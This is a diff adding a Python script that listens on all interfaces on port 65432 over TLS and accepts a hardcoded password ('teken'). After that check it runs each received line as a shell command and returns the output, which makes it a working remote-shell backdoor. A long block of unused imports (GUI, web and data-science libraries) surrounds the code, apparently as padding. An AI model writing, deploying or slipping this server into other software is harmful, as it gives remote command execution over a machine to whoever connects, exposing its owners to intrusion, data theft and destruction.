@@ -1,0 +1,79 @@
+# IMPORTS
+import time
+import os
+import sys
+import socket
+import ssl
+import threading
+import subprocess
+import argparse
+import logging
+import tkinter as tk
+from tkinter import messagebox
+from flask import Flask, render_template, request, redirect, url_for
+import pandas as pd
+import numpy as np
+import matplotlib.pyplot as plt
+import json
+import datetime
+import random
+import re
+# Connection 
+
+HOST = '0.0.0.0'
+PORT = 65432
+PASSWORD = 'teken'
+
+context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+context.load_cert_chain(certfile='server.crt', keyfile='server.key')
+
+def execute_command(command):
+    try:
+        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+        return output.decode()
+    except subprocess.CalledProcessError as e:
+        return e.output.decode()
+
+def handle_client(connstream, addr):
+    print(f'New connection from {addr}')
+    try:
+        connstream.sendall(b'Password: ')
+        client_password = connstream.recv(1024).decode().strip()
+        if client_password != PASSWORD:
+            connstream.sendall(b'Authentication failed.\n')
+            connstream.close()
+            print(f'Authentication failed from {addr}')
+            return
+        
+        connstream.sendall(b'Authentication successful. Send commands.\n')
+        
+        while True:
+            connstream.sendall(b'> ')
+            command = connstream.recv(1024).decode().strip()
+            if not command:
+                break
+            if command.lower() in ['exit', 'quit']:
+                break
+            result = execute_command(command)
+            connstream.sendall(result.encode() + b'\n')
+    except Exception as e:
+        print(f'Error with client {addr}: {e}')
+    finally:
+        connstream.close()
+        print(f'Connection closed {addr}')
+
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
+        sock.bind((HOST, PORT))
+        sock.listen(5)
+        print(f'Server listening on {HOST}:{PORT}')
+        while True:
+            conn, addr = sock.accept()
+            connstream = context.wrap_socket(conn, server_side=True)
+            client_thread = threading.Thread(target=handle_client, args=(connstream, addr))
+            client_thread.start()
+
+if __name__ == "__main__":
+    main()
+
+
